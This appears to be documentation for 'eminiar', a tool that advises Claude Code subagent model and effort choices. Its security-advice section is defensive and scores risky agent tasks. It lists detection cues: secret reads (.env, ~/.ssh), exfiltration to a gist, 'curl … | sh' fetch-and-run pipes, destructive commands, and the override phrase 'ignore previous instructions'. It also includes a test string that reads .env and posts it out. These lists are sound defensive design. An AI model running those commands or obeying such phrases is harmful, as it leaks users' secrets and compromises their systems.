| `effortEnv` | the dispatch hook | `CLAUDE_CODE_EFFORT_LEVEL` while it is set (`other` for a value that is not a level) |
| `agentEffort` | the dispatch hook | the agent file's frontmatter `effort` (not for a fork) |
| `actualEffort` | reconcile | the level the subagent ran at: the most common `effort` of its `api_calls` rows (on a tie, the one seen last) |
| `effortFollow` | reconcile | `followed` or `ignored`; absent when the dispatch is not counted |

Only known levels (`low` … `max`) are stored. The level that ran comes from the subagent's
transcript: each API call records its `effort`, which usage ingestion copies into
`api_calls.effort`. The `effort` in a subagent's `meta.json` only echoes what the Agent call
passed, so it is not used: a model that lacks the level, or `CLAUDE_CODE_EFFORT_LEVEL`, can make
the subagent run at another one.

A dispatch is **not counted** when its advice named no level, the level that ran is unknown (no
calls ingested yet, or none with an effort), it is a fork, `CLAUDE_CODE_EFFORT_LEVEL` was set, or
the brief was [saturated](#how-it-decides) (the plan row's scoring decides when there is one;
in apply mode such a brief still gets its effort set). Otherwise:

- When the hook applied an effort (`effortApplied`), the dispatch is **followed** when the level
  that ran equals the advice and **ignored** otherwise. The hook's level wins over the call and
  the agent file, and a model without effort support records no level at all (so it is not
  counted), so a different level means something else changed it.
- Without an applied effort (advise mode), it is **followed** when the level that ran equals the
  advice, or the effort set for the call is the advised level (a model without that level runs
  the next one down, so setting it is following): the level the call passed, or, when the call
  passed nothing, the level the agent file sets (the hook tells the coordinator to pass nothing
  then); a passed level wins over the agent file's. It is **ignored** when neither holds.

`em_adjudicate stats` and `eminiar adjudicator stats` add a line once a dispatch has been
counted:

```text
effort followed 75% (3 followed, 1 ignored of 4) · set but not run 1
```

The rate is followed ÷ (followed + ignored). "Set but not run" counts the dispatches whose
effort was set on the call and that then ran at a different level (`effortIneffective`, out of
`effortChecked`: the dispatches with both a set and a ran level). The set level is the one the
hook applied (`effortApplied`), else the one the call passed (`passedEffort`). `stats --json`
carries them under `summary` as `rates.effortFollow`, `effortFollowed`, `effortIgnored`,
`effortChecked` and `effortIneffective`. The Adjudicator tab shows the rate next to the follow
rate. The swarm view shows the level that ran on each decision (else the level that was in
force: the environment variable, the hook's, the call's, then the agent file's), marked
"(applied)" when the hook set it and "(ignored)" when the advice was not followed.

Reconcile normally skips rows that are already final. So that dispatches which settled before
eminiar recorded effort still count, each reconcile pass also fills in the effort keys of old
final rows, newest first: it looks at up to 1,000 dispatch rows and repairs at most 200 of them,
only rows linked to a subagent whose `scores` have no `actualEffort` yet and whose API calls
record an effort. It writes only those keys, and is skipped when `learning.enabled` is false. A
repaired row that recorded none of `effortApplied`, `agentEffort`, `passedEffort` or `effortEnv` (a
legacy row) gets the level that ran but no verdict, so it is not counted. Until the
repaired rows include some that can be counted, the dashboard's effort rate is n/a (shown as
"—") and `stats` prints no effort line.

## Swarm plans

With `surfaces.plan` on, `em_swarm plan` scores all new tasks in one batched call (within
`timeouts.planMs`; the heuristic answers if the provider fails) and appends one line per task.
In this example the coder role has `model: sonnet` and
`model_range: { floor: haiku, ceiling: opus }`, and the reviewer role pins `model: opus`:

```text
Planned 4 task(s) in run …; claimable now: #5, #6, #7, #8.
Next: spawn one worker per claimable task with the Agent tool: subagent_type …, and a prompt that names "task #N" (the worker claims it), passing `model` and `effort` as each suggestion below says; leave `model` unset for pinned agents; run_in_background: true runs them in parallel. …
…
Adjudicator suggestions: pass the model as `model` and the effort as `effort` on each Agent call (`effort` needs Claude Code 2.1.292 or later); a pinned agent keeps its model: pass no `model`; a saturated brief's effort is informational: pass no `effort`:
#5 → swarm-feature-coder · model haiku (range haiku–opus, fallback sonnet) · effort low (complexity 1, conf 0.82)
#6 → swarm-feature-coder · fallback sonnet (range haiku–opus; matches the adjudicator's pick) · effort medium (complexity 2, conf 0.74); role suggested: tester (planned: coder)
#7 → swarm-feature-reviewer · pinned opus (adjudicator would pick haiku; remove the pin in swarm.yaml to let it choose) · effort low (complexity 1, conf 0.80)
#8 → swarm-feature-coder · model opus (range haiku–opus, fallback sonnet) · effort max: informational (brief saturated; complexity 4, conf 0.81)
```

A role with a [model range](swarms.md#model-ranges) gets the adjudicator's pick inside its range
and inside `apply.floor` … `apply.ceiling`: `model haiku (range haiku–opus, fallback sonnet)`
means pass `model: haiku`. When the pick is the fallback's tier, or no tier lies inside both
bounds, the line names the fallback and there is no `model` to pass. A role whose agent pins a
model (its `model` in `swarm.yaml` without a range, or any agent definition Claude Code would
find first) keeps it; a definition that cannot be read shows `model pin is unknown`. When every
role of the swarm pins a model, the line under the head says so: "every role pins a model: the
adjudicator cannot change any worker's model (add model_range in swarm.yaml)"; apply mode still
sets each worker's `effort`.

With `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` on the model is informational (`model haiku
(informational)`, no pin or range named), and with `CLAUDE_CODE_EFFORT_LEVEL` set the effort is.
In advise mode so is the effort of a [saturated](#how-it-decides) brief (#8 above). The head and the "Next:"
line follow [the same rule](#what-the-advice-tells-you-to-pass), so they never disagree: with
every agent pinned in advise mode, "Next:" says "passing `effort` as each suggestion below says;
leave `model` unset for pinned agents"; in apply mode it says "the suggestions below are
informational: leave `model` unset for pinned agents; the hook sets `effort` (apply mode): pass no
`effort`". If scoring fails outright, the plan still succeeds, the MCP server
logs the error on stderr, and the plan ends with "Adjudicator advice unavailable for this plan
(the tasks are planned)."

The planned role gets a head start in scoring, so "role suggested" appears only on strong
evidence: a role-table confidence of at least 0.7. When the worker is dispatched, the hook
reuses the plan's verdict for that task rather than scoring again, and records whether the
coordinator followed it: the call's `model` is compared with the tier the line and the note
name (clamped to `apply.floor` … `apply.ceiling`, and for a ranged role to its range), not
with the raw verdict, so passing what the line says counts as followed. It finds the task from the `task #N` in the Agent prompt. When the
prompt names several tasks (to give context, say), it links the one still open for that
worker's role, preferring a task that can be claimed now; a single `task #N` links only a task
for that role or for no role. Without a linked task, the hook scores the dispatch text itself
and the decision is not tied to the run.

Advise and apply mode give the same answer. In advise mode the coordinator passes `model` (and
`effort`) where the suggestion says to, which Claude Code honours unless
`CLAUDE_CODE_SUBAGENT_MODEL_FORCE` (or `CLAUDE_CODE_EFFORT_LEVEL`) is set, so it works only as
well as the coordinator follows the lines. In apply mode the hook sets the model and the effort
itself. Each line then reads `effort low (applied by the hook)`, a saturated brief's included,
and the head and the "Next:" line say to pass no `effort`: "the hook sets `effort` on the Agent
call in apply mode, so pass no `effort`". With `CLAUDE_CODE_EFFORT_LEVEL` set the effort stays
informational, as in advise mode. The same holds with `surfaces.agent` off: the dispatch hook
does not run, so nothing is applied and the plan gives the advise-mode wording.

## em_adjudicate

An MCP tool, registered only while the adjudicator is on. See [Tools](tools.md#adjudicator).

```text
em_adjudicate {action: "score", text: "rename parseDate in src/utils/date.ts"}
em_adjudicate {action: "score", tasks: [{key: "a", title: "Add a --json flag to stats", role: "coder"}]}
em_adjudicate {action: "explain", id: 42}
em_adjudicate {action: "stats", since: "7d"}
em_adjudicate {action: "feedback", id: 42, outcome: "too_small", note: "needed opus"}
```

`score` returns one line per item with a decision id. `explain` shows the score tables with
their reasons, the features, the blend weights, the provider status, the cost and the outcome.
`stats` summarises decisions, follow rate, [effort follow-through](#effort-follow-through) and
savings. `feedback` (`good`, `too_small` or
`too_big`) closes the decision and teaches the learned bias.

## Dashboard

`eminiar ui` has an **Adjudicator** tab: decisions per day, follow and fallback rates, provider
health, a call log with a detail drawer, savings with their assumptions, a try-it box and the
last eval report. See [Dashboard](dashboard.md#adjudicator).

### Jev impact

With the adjudicator on and TypeSafe Jev as the provider, the tab adds a **Jev impact** panel.
With no key or consent it still shows, with a banner that every decision falls back. It asks whether Jev changed what the heuristic would have chosen, and whether that helped. The
report itself reads only what the adjudicator already recorded: nothing is re-scored, no prompt
text is read, and no request goes to Jev. The heuristic's pick is rebuilt from each stored blend
table. Each load of the panel first runs the same outcome reconcile as the other dashboard reads,
which does write: it settles pending outcomes and updates the learned bias. If that fails, the
panel still loads and the response says so in its `reconcile` field.

The verdict is *helping* when the 90% lower Wilson bound of help ÷ (help + hurt), over the
dispatches Jev changed, is above 50%, and *hindering* when the upper bound is below 50%. It says
**not enough data** below 10 labelled outcomes, below 30 compared plan or agent decisions that
Jev answered inline (prompts and cache hits are not counted), or when the labelled outcomes come
from fewer than 3 different swarm runs or sessions, or when the evidence is split. A downgrade that finished is help and one that failed is hurt. An upgrade counts only
through your feedback (good, too small, too big), since finishing on the bigger model cannot show
the smaller one would have failed; the panel states how many upgrades were left out. Warnings
(Jev failing often, a degraded provider, an open breaker, negative net) never change the label.

Left out, and why:

- **Advice not followed.** A dispatch that ignored the advice, or passed no model, did not run
  Jev's tier, so its outcome says nothing about Jev. Your feedback on it is left out too: it
  judges the model that ran, not Jev's. Feedback counts only on dispatches that ran the advised
  tier, like outcomes.
- **Outcomes not final yet.** A dispatch that ran the advised tier but whose outcome may still
  change is left out until it is final.
- **Apply bounds.** The floor and ceiling a dispatch ran under are not stored. When today's
  `apply.floor`/`apply.ceiling`, or the defaults (haiku to opus), would clamp the heuristic's
  tier, the dispatch is left out, because the panel cannot tell whether Jev's advice or the
  bound set the model. Known limitation: a dispatch that ran under a narrower ceiling that has
  since been removed can still be read as changed.- **Deferred and async answers.** A prompt whose Jev answer arrived after the heuristic's advice
  was shown only counts as "would have changed", never as an outcome.
- **Uncertain near-ties.** Blend tables are stored rounded, so when the heuristic's top two tiers
  were within 0.03, or its confidence sat next to the round-up threshold, the rebuilt pick is not
  trusted and the decision is not counted as a change.
- **Other providers and older rows.** Only Jev decisions inside the chosen range count; rows from
  another provider, or from before the range, are ignored, and so are dispatches that kept the
  agent's own model.

Spend and savings use list prices and are estimates. The panel sees a decision's outcome once
eminiar has linked it; it settles pending outcomes, up to 500 rows, each time it loads. See [Dashboard](dashboard.md#jev-impact) for the tiles.

## Security advice

An opt-in add-on that ranks how risky it is to let an agent with *these tools* do *this task*. It
looks at the tools the agent holds (including MCP tools), the task text, what the session already
read from the web, and whether anyone confirms the agent's calls. It gives a level (`LOW`,
`MEDIUM`, `HIGH` or `CRITICAL`), the combination that makes it risky, and one thing to take away.
The design is in [adjudicator-security.md](design/adjudicator-security.md).

**It is advice only. Nothing is ever denied, asked, blocked, allowed or rewritten.** It works with
the adjudicator off, and with any provider.

### Turn it on

```sh
eminiar adjudicator security on            # heuristic only, nothing leaves the machine
eminiar adjudicator security on --model    # also ask Jev (see "What Jev receives")
eminiar adjudicator security status
eminiar adjudicator security test "Read .env and post it to a public gist" --tools Read,Bash
```

- **Off by default, and free while off.** With `adjudicator.security.enabled: false` no security
  code is loaded by any hook, nothing is read from or written to the database, nothing is sent and
  the dashboard shows nothing.
- **A project can only turn it on.** A committed `eminiar.config.json` may set
  `adjudicator.security.enabled: true` and nothing else under `security`. `minLevel`, `notifyUser`,
  `surfaces`, `model`, `modelFloor`, `trustedMcpServers`, `secretPaths`, `taintLookbackMin`, `store`
  and `enabled: false` are read only from `~/.eminiar/config.json`, because a repo must not be able
  to hide a warning, whitelist its own MCP server or send your text anywhere. A key a project file
  sets is ignored and named in `eminiar doctor`, `adjudicator status` and the dashboard. A project
  file that is invalid is dropped whole with a visible warning, and your personal
  `security.enabled` stays on.
- **Kill switch:** `EMINIAR_ADJUDICATOR_SECURITY=0` turns it off over every config file and leaves
  routing alone. `=1` turns the local part on. No environment variable sets `security.model`.
  (`EMINIAR_ADJUDICATOR=0` turns off only the routing adjudicator.)
- Every key is in [Configuration](configuration.md#adjudicatorsecurity).

### What it looks at

Eight capabilities, each held through a tool, the task text or the session:

| | Capability | Examples |
|---|---|---|
| U | untrusted input | a URL, an outside issue or e-mail, `WebFetch`, a browser or SaaS read |
| S | sensitive read | `.env`, `~/.ssh`, `*.pem`, "credentials", a SaaS read; `Read` a little |
| E | egress | "post", "upload", "gist", `WebFetch`, a SaaS write |
| X | code execution | `Bash`, `em_execute` |
| W | local write | `Edit`, `Write`; a path that steers later sessions (`.claude/`, `CLAUDE.md`, `.mcp.json`, hooks, CI) |
| D | destructive | delete, force-push, `rm -rf` |
| P | privilege | `sudo`, `terraform apply`, cloud tools |
| T | tool supply | `npm install`, `npx`, `curl … \| sh`, adding an MCP server, an unknown MCP server |

Rules score the dangerous combinations: the **lethal trifecta** (U, S and E), the **Rule of Two**,
untrusted input with execution, supply chain with execution, untrusted input with destroy or
privilege, untrusted input with a persistence path, and a named secret with egress. The score is
the weighted capabilities plus the rules, times 0.85, 1.0 or 1.25 for a manual, default or
unattended session (`bypassPermissions`, `dontAsk` or `auto`).

### Levels

The level is **rule driven**, not a score band:

- **LOW** and **MEDIUM**: the score is under or over 25 and no combination is complete.
- **HIGH**: a *complete* combination, every leg at least half strength (the trifecta, the Rule of
  Two, untrusted input with execution, untrusted input with a persistence path), or the model says
  so. A URL the agent can reach only through its shell (no granted tool can fetch) does not
  complete a combination by itself: it counts only together with another cued leg (a secret, an
  egress, a destructive or privileged step, a persistence path, an install, or an intent cue). A general-purpose agent that merely holds `WebFetch` is MEDIUM; the same agent told to
  research a URL while holding `Bash` and `Read` is HIGH.
- **CRITICAL** comes **only from fixed triggers**, never from the model. Deliberate trade-off: that
  shell-only URL rule applies to C1 and C5 too, so a shell plus a URL running unattended with
  nothing else cued is MEDIUM, not CRITICAL. The agent can fetch when a granted tool does:
  `WebSearch`, `WebFetch`, `em_docs`, a browser or a SaaS read do; `em_search`, `em_recall` and
  `Skill` do not.
  - **C1** the full trifecta, running unattended;
  - **C2** a strong trifecta (every leg at .8 or more) where the **task text itself** reads
    secrets or sends data (a grant alone stays HIGH);
  - **C3** the text names a secret and an egress action, and the agent can do both;
  - **C4** the text fetches remote code and runs it, and the agent has a shell;
  - **C5** untrusted input with a persistence path, running unattended;
  - **C6** text that says *ignore previous instructions*, *exfiltrate* or *conceal* (hide what it
    does from the user), when the agent can send data or run code. "Skip the hooks" and
    `--no-verify` are routine and are not C6.
- **Review wording** ("review", "audit", "check that we don't", "write tests for the leak") halves
  the text cues in the **score and the LOW/MEDIUM band only**. It never lowers a level a floor
  (HIGH or CRITICAL) sets, and it never dampens an intent cue (*ignore previous instructions*,
  *exfiltrate*, *conceal*). It counts only in the task's own text (the title and detail, an Agent
  call's description and prompt, a typed prompt), never in an agent or role description, so an
  agent file that says "audits code" cannot lower anything. Any intent cue in any text drops it.
  Test-writing wording ("write tests for", "tests that") needs a flaw word (vulnerability,
  injection, leak, exfiltration, XSS, CSRF, SSRF, security bugs) to count. "Audit log", "audit
  trail", "audit event", "audit entry", "audit record" and "audit table" are nouns, not review
  wording.
- **Apply mode stands down on HIGH and CRITICAL.** The dispatch sets no model and no effort, so
  there is no rewrite and no auto-allow; the note reads `apply held: security HIGH`.
- **Model floor.** On HIGH and CRITICAL, model advice never names a tier below `modelFloor`
  (default `sonnet`) or below the dispatch's baseline: it says `keep <model>: security HIGH`
  instead of passing a smaller model.

### How to read a line

```text
eminiar security: HIGH 71 · U task URL · S Read+shell · E WebFetch · R1 R3 · drop E: no WebFetch for this agent
eminiar security: CRITICAL 96 · C3 secret→egress · S task secret file · E task public egress · do not run unattended: confirm with the user
```

After the level and score come the legs that are held and where from: `task` (the text), `session`
(something the session already fetched), a tool name, or `shell` (what a shell can do). Then the
rules or the CRITICAL trigger, `jev raised MEDIUM→HIGH (sev 3.6, exfil .91)` when the model moved
the level, and the leg to drop. `eminiar adjudicator security explain <id>` shows every exposure,
rule and reason.

### Where it shows up

| Surface | What you see |
|---|---|
| Subagent spawn | A note to Claude from `security.minLevel` (default `high`). With `security.notifyUser` (default `critical`) a message to you as well |
| `em_swarm plan` | `Security (advice only): 1 critical, 2 high, 3 medium · model jev ok` and one line per task from `minLevel`. The block has its own budget of 1500 characters: the head stays, the highest-risk lines are kept, and the head counts the lines left out (`2 more lines left out`). With routing advice on, a HIGH task's advised model is raised to `modelFloor` and marked `(security floor)` |
| Your prompt | A line **only at CRITICAL**, and each distinct warning once per session (constants `PROMPT_MIN_LEVEL`, `PROMPT_DEDUPE_SESSIONS`, `PROMPT_DEDUPE_SIGNATURES` and `PROMPT_DEDUPE_KEY` in `src/adjudicator/security/hook.ts`). A prompt that mentions a URL would otherwise make nearly every prompt HIGH |
| `em_adjudicate` | `{action: "security", text \| tasks, tools?, agent_type?, role?, autonomy?}`; `explain {id}` appends the linked assessment |
| CLI | `eminiar adjudicator security status\|on\|off\|test\|explain\|list\|eval` ([CLI](cli.md#security-advice)) |
| Dashboard | A **Security** panel in the Adjudicator tab, and risk badges in the Swarms tab ([Dashboard](dashboard.md#security-panel)). Both render only while security is on |
| `eminiar doctor` | `adjudicator security` and `adjudicator security eval` lines, only when security is on, its model setting is set or an eval was saved |

LOW is never shown. Every assessment is recorded (`security.store`) so the dashboard can chart it.

### What Jev receives

`security.model` defaults to `"off"`. With `"provider"` (personal config only, and only when the
adjudicator is on with Jev, its consent and key) the security questions ride on a request the
adjudicator already makes: `em_swarm plan`, `em_adjudicate security`, and `security test|eval
--provider`. A dispatch or prompt hook never waits for a model. On top of the redacted task text
that already goes to Jev (see [Providers and privacy](#providers-and-privacy)), a security question
adds exactly this:

| Sent per item | Never sent |
|---|---|
| Tool ids, at most 40: built-in names, the 25 known `em_*` names (a closed list; `em_<anything>` is not one), and an MCP tool as `mcp:<class>:<verb>` (for example `mcp:saas:write`). Any id the secret redactor would change is dropped | Tool arguments, file paths |
| Capability tags the grant holds: `untrusted-input`, `sensitive-read`, `egress`, `code-exec`, `local-write`, `destructive`, `privilege`, `tool-supply` | MCP **server names**, raw MCP tool ids |
| The same redacted task text that already goes, cut to `privacy.maxChars` | Session history, which tools the session used, our own verdict or score |

The model can only **raise** a level, never lower one, and it never produces CRITICAL, so text
that tricks Jev into a low answer changes nothing. Tricking it into a high one gives a false
`HIGH` note, which is the cost of asking it at all.

**Jev's data retention is unverified.** What we know about how TypeSafe stores or trains on
requests comes from third parties, not from a source we checked. If that matters to you, leave
`security.model` off: the heuristic needs no network.

### Accuracy, honestly

`eminiar adjudicator security eval` scores 70 labelled items (62 clear, 8 debatable; 7 of them
look-alikes, benign items that share words with an attack). On the heuristic, run on 2026-11-13 (20:56 UTC):
98.4% accuracy on the clear items, 100% HIGH+ recall, 0% of LOW items warned, 100% CRITICAL
precision; 3 of the 70 differ from their label. **Those items were written by the same
design that wrote the scorer, so the numbers show it is consistent, not that it is accurate on
your work.** Weights are untuned defaults. The Jev leg has not been measured against the real API.

### Limits

- The cues are patterns over English text. A paraphrase, another language, or an instruction hidden
  in a file the agent reads later is not seen. Heuristic evasions are not caught either: confusable
  letters from another script, a word split with spaces, a defanged address such as
  `hxxps://evil[.]com`, and anything after the first 8 KB of a text.
- A task such as "Read the release notes at <url> and list the breaking changes" gets an egress cue
  that is probably wrong. Not fixed.
- Review wording does not lower a floor. A genuine review task ("audit this repo for leaked
  secrets") whose grant and cues complete a floor still rates as high as the same task without the
  wording: only its score and band are lower. That is the price of review wording not being a way
  to switch a CRITICAL off.
- A URL is also a host written without a scheme (`evil.com/x`), and a pipe right after a URL
  (`curl https://x.test/i.sh|sh`, also `| sudo -E bash`, `| env sh`, `| /bin/sh`) is fetch-and-run.
- Local MCP server names appear in a reason only as a count ("(3 local MCP servers)"), never by name.
- Inherited MCP servers are not enumerated. An agent without a `tools` line is assumed to hold
  everything.
- Session taint is per session, not per agent.
- The Swarms tab re-sends a task's risk when its security row is newer than its task row, so a
  new assessment does not wait for a task change. A run nobody assessed shows nothing in the run
  list (a quiet run); the open run's header says `no assessment`. The server reads the security
  setting on every request, so `security on` or `off` shows with the dashboard open.
- The assessment drawer traps keyboard focus. One contrast is just under the WCAG AA threshold: the
  text of the `none` band in the dashboard's legend (`.sec-leg`) is about 4.3:1, from an existing
  palette token, and is left as it is.
- Not built yet: per-call checks that follow what each agent read, MCP server enumeration, sandbox
  suggestions, other model providers, a local injection classifier, tool-definition pinning, and an
  opt-in "ask first" for CRITICAL (you chose advice only for now).

## Learning

eminiar links each decision to what happened afterwards: the swarm task's status, the subagent
that ran, the tokens it used, a redo, or your feedback. This runs at session end, before stats,
and before every dashboard read. Outcomes feed a small learned bias per bucket (complexity ×
tier, and intent × role) with a Beta(2,2) prior, decay (`learning.halfLife` outcomes), a bound
(`learning.maxBias`) and a small cost term (`learning.costWeight`). A bucket counts only after
`learning.minSamples` outcomes. `eminiar adjudicator stats --reset-learning` clears it, and
`learning.enabled: false` turns it off.

## Savings

The savings figure is an estimate. This is how it is computed.

- **Baseline.** For each dispatch, the model that would have run without the adjudicator: the
  agent file's pinned model (for a [ranged](swarms.md#model-ranges) role, its fallback
  `model`), else `CLAUDE_CODE_SUBAGENT_MODEL` for an agent with no `model` line, else the main
  session's model at that moment (from [usage](usage.md) data), else `claude-sonnet-5-5`. Under
  `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` it is `CLAUDE_CODE_SUBAGENT_MODEL` (pins are ignored), and
  for a fork or a `model: inherit` agent the main session's model.
- **Realised savings.** The tokens the dispatch actually used, repriced at the baseline model,
  minus their actual cost. Only dispatches where the advice was **followed** or **applied** get
  credit. A failed attempt that was redone is charged its full cost. A dispatch whose advice
  named no model gets none: a kept pin (pinned or unknown), a ranged role that kept its
  fallback, `CLAUDE_CODE_SUBAGENT_MODEL_FORCE`, or a fork.
- **Net** = realised savings − the adjudicator's own provider spend.
- **Potential savings.** Prompts whose advised tier was below the model that ran, repriced at
  the advised tier. Shown separately and never added to net.

Assumptions, shown next to every figure:

- Token counts would have been the same on the baseline model. Smaller models can need more
  turns, so compare tokens per successful task by tier (the dashboard and `--json` stats show
  it).
- List prices, with cache pricing unchanged (`usage.pricing` overrides apply).
- Credit only for dispatches that were followed or applied; a failed attempt that was redone is
  charged its full cost.
- No credit for a dispatch to an agent whose model pin the advice kept (pinned, or a pin that
  could not be read): the adjudicator chose nothing there.
- For a role with a model range the baseline is its fallback (the model the agent file pins),
  and a ranged dispatch earns credit like any followed advice.
- For an agent with no `model` line, the baseline is `CLAUDE_CODE_SUBAGENT_MODEL` when it is set
  (and FORCE is off), else the main session's model.
- No credit while `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` is on, nor for a fork (it runs on the main
  session's model): Claude Code, not the advice, sets the model.
- The adjudicator's own provider spend is subtracted.
- No credit for tool advice: `em_stats` already counts the context kept out by `em_*` tools.
  Only the tool-advice follow rate is reported.
- Main-session advice yields potential savings only and is never added to net: the
  counterfactual cannot be observed.

Without usage ingestion (`usage.enabled: false`, or before the first ingest) there is no actual
or baseline cost, and the report says so.

## Accuracy

`eminiar adjudicator eval` scores a labelled set and compares each provider with the heuristic.
The built-in set has 40 items. Two held-out sets of 60 items each live in the repository's
tests, outside the package. Results on 2026-11-04 (tier = exact Claude tier; complexity ±1 =
within one step on the 0–4 scale):

| Set | Majority class | Heuristic, tier | Heuristic, complexity ±1 | Embedding blended, tier | Embedding blended, complexity ±1 |
|---|---|---|---|---|---|
| Built-in, 40 (the heuristic was tuned on it) | 47.5% | 92.5% (37/40) | 97.5% | 90.0% (36/40) | 100% |
| Held-out, 60 (used to check tuning) | 50.0% | 83.3% (50/60) | 95.0% | 81.7% (49/60) | 100% |
| Held-out 2, 60 (blind) | 45.0% | 78.3% (47/60) | 95.0% | 78.3% (47/60) | 93.3% |

What this says:

- The **heuristic** is the offline baseline, and the blind held-out set is the honest one: about
  78% exact tier against 45% for always guessing the most common tier. Its errors lean towards
  a larger model (16.7% over-tier against 5.0% under-tier on the blind set), as designed.
- The **embedding** provider barely adds anything over the heuristic. The blend is equal or one
  item worse on tier, and gains or loses a few points on complexity ±1. The eval verdict was "no"
  on all three sets. Use it if you like, but expect the heuristic's results.
- **Jev** (`typesafe`, pinned `jev-1.14.0`) was measured on 2026-11-05 with the default
  weights. Its blend is the first provider that beats the heuristic overall:

  | Set | Heuristic, tier | Jev blended, tier | Jev blended, complexity ±1 | Verdict |
  |---|---|---|---|---|
  | Built-in, 40 | 92.5% (37/40) | 87.5% (35/40) | 97.5% | no (−5.0 pp tier) |
  | Held-out, 60 | 83.3% (50/60) | 85.0% (51/60) | 98.3% | yes |
  | Held-out 2, 60 (blind) | 78.3% (47/60) | 95.0% (57/60) | 98.3% | yes (+16.7 pp tier) |

  Over all 160 items that is 143 against 134. The blend removes most of the heuristic's
  over-tiering: on the blind set, over-tier falls from 16.7% to 1.7% and under-tier goes from
  5.0% to 3.3%. The built-in loss is on the set the heuristic was tuned on. The
  cost is that opus recall drops from 20/20 to 18/20: Jev calls a security review and an OAuth
  flow sonnet while the heuristic is sure of opus. Jev's answers drift a little between runs
  (3 of 160 top choices flipped between two passes), so expect ±1 item per set. A sweep over
  `providerMax`, `lowConfidence` and several alternative tier rules (a guard that keeps a
  confident heuristic opus call, a 3-way mix with a complexity-derived tier) found nothing
  that beats the defaults robustly, so the defaults stay. About half of the remaining misses
  are items where the heuristic and Jev agree on the wrong tier. A cost of $0.02 per 1000
  items and p50 ~340 ms per batch of 10 make it practical for plans and prompts, not for the
  PreToolUse hot path.
- **The OpenAI-compatible providers are unmeasured.** The harness supports them, but no run
  with a key has been recorded. Measure them, or re-measure Jev, on your own key before relying
  on them:

```sh
eminiar adjudicator eval --providers typesafe            # or --provider groq, --provider ollama, …
eminiar adjudicator eval --providers typesafe --save     # keep the report for the dashboard
```

Every run ends with one verdict line, for example
`embedding beats heuristic-only on tier+complexity: no (Δ tier -2.5 pp, Δ complexity ±1 +2.5 pp)`.
"Yes" needs neither difference to be negative and one to be positive. Remote providers need
consent and a key here too; a provider without them is listed as skipped. The report also shows
role and tool accuracy, under- and over-tier rates, answer validity, timeouts, p50/p95 latency,
tokens and $ per 1000 items, and accuracy above and below confidence 0.8. It never contains item
text.

To test on your own data, label items as `{text, tier, complexity, role, tool}` in a JSON file:
`eval --fixture my-set.json` adds them to the built-in set, and `--replace` uses them alone.
Hold out about 30% before you tune `weights.features`, and grow the set past 100 items. In a
source checkout, the held-out sets run with
`npx tsx src/cli.ts adjudicator eval --fixture tests/fixtures/adjudicator-heldout-2.ts --replace`.

## Budgets, breaker and limits

Every path has a hard deadline and falls back to the heuristic, so a slow or broken provider
costs at most its timeout.

| Guard | Default | What happens |
|---|---|---|
| Timeouts | prompt 1200 ms, agent 800 ms, plan 3000 ms, local providers 600 ms | The heuristic answers when the provider misses the deadline |
| Circuit breaker | opens after 2 consecutive failures, for 120 s | Timeouts, 5xx, 429/529 and refused connections count; other 4xx and bad answers do not. After the cooldown one trial call goes through; success closes it |
| Slow guard | p95 above the surface budget, over at least 5 calls | The provider is skipped for the breaker cooldown, then the latency history starts over |
| Daily spend cap | `budget.dailyUsd` $0.50 per remote provider per UTC day | The provider is skipped for the rest of the day. Local providers are never capped. A call with an unknown price adds $0 |
| Daily call cap | `budget.dailyCalls` 2000 per remote provider per UTC day (`0` = unlimited) | The provider is skipped for the rest of the day. This is what limits a provider whose price is unknown. Every call that reached the provider counts, failures too; a dashboard try-it call counts as well |
| Auth lockout | 1 hour | A 401 or 403 marks the key as rejected. The provider is skipped with no network call until the key changes or the hour passes. Status shows "API key rejected" |
| Verdict cache | 24 h, 2000 entries | Blended verdicts are reused for the same text; the heuristic is not cached because it is cheaper than a lookup |

The breaker state, spend and calls live in the project database, so every hook process sees them.

## Troubleshooting

Start with `eminiar adjudicator status` (or `eminiar doctor`, which adds the adjudicator checks;
`doctor` also makes a 2-second live probe of the provider). The status names the configured
provider, the one that actually runs, and why they differ.

| Symptom | Cause and fix |
|---|---|
| `em_adjudicate` is missing | The MCP server registered its tools before you enabled it: `/mcp reconnect`. Or it is off: check `status` for which layer decides (`env EMINIAR_ADJUDICATOR`, project file, global file) |
| "the heuristic runs until: no key for typesafe" | `eminiar adjudicator key set typesafe` |
| "… sends redacted prompt text to …: run `eminiar adjudicator enable --accept-remote`" | Consent is missing. Consent in a project file is ignored on purpose |
| "… which you have not agreed to (consent is per origin)" | You agreed to another host. Consent covers only the origins in `remoteConsentOrigins`; no environment variable grants it. Run `enable --accept-remote` to agree to this one |
| "redirect to … refused" | The provider answered with a 3xx. eminiar never follows redirects; set the base URL to the final endpoint |
| "eminiar.config.json sets adjudicator.… : ignored" | The project file set a provider, URL, key, cap, timeout, apply mode, `apply.*` or the tier ladder. Those are personal: move them to `~/.eminiar/config.json` (`eminiar adjudicator provider …`; for apply mode, `eminiar adjudicator enable --mode apply`) |
| "the key file is readable by others and was ignored" | `chmod 600 ~/.eminiar/adjudicator.key` |
| "API key rejected (HTTP 401)" | The key is wrong or revoked. Store a new one with `key set`; the lockout lifts as soon as the key changes |
| "the custom preset needs openai.baseUrl and openai.model" | Set both: `eminiar adjudicator provider openai-compatible --preset custom --base-url … --model …` |
| embedding shows `hook_context` | Expected: the embedding provider runs in the MCP server and CLI. Hooks use the heuristic, or a verdict the server cached |
| Fallback rate is high, status `breaker_open`, `slow_guard` or `timeout` | The provider is too slow for the budget. Use a smaller local model, raise `timeouts.localMs` / `promptMs`, or use `promptMode: "async"` |
| Status `over_budget` | The daily `budget.dailyUsd` or `budget.dailyCalls` cap was reached; it resets at 00:00 UTC |
| Apply mode shows "k of n applied dispatches ran the chosen model" with k below n | Claude Code takes the model the hook sets, so something else changed it, or the check matched the wrong calls: `CLAUDE_CODE_SUBAGENT_MODEL_FORCE` (status warns about it); an organisation `availableModels` list, which makes Claude Code substitute another model; a plugin mod whose `agent.spawn` hook sets the model (it outranks the call), or another plugin's PreToolUse hook that rewrites the Agent input; or a link gap, where the dispatch was matched to another subagent's API calls (a fork started at the same moment runs on the main session's model) or its usage was not ingested yet. `em_adjudicate {action: "explain", id}` shows the model that ran |
| Apply mode changes no swarm worker; status warns "every role of swarm … pins a model" | Each role's agent file pins a model and none has a range, and apply mode respects pins. Give the roles that may move a [`model_range`](swarms.md#model-ranges) in `swarm.yaml`, then run `eminiar swarm sync`. A range edited by hand in an agent file is not read |
